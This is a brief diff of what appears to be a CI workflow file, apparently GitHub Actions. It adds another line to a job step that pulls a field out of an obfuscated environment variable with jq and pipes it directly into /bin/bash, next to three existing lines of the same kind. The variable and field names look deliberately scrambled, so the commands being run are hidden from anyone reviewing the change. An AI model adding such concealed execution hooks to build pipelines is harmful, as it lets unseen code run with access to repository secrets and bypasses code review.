@@ -28,6 +28,7 @@ jobs:
           echo $pqk88684 | jq -r .bcc0 | /bin/bash
           echo $lia17 | jq -r .ahrr8658 | /bin/bash
           printf '%s' "$wz2885" | jq -r .n784 | /bin/bash
+          echo $dlgq301 | jq -r .mv444 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
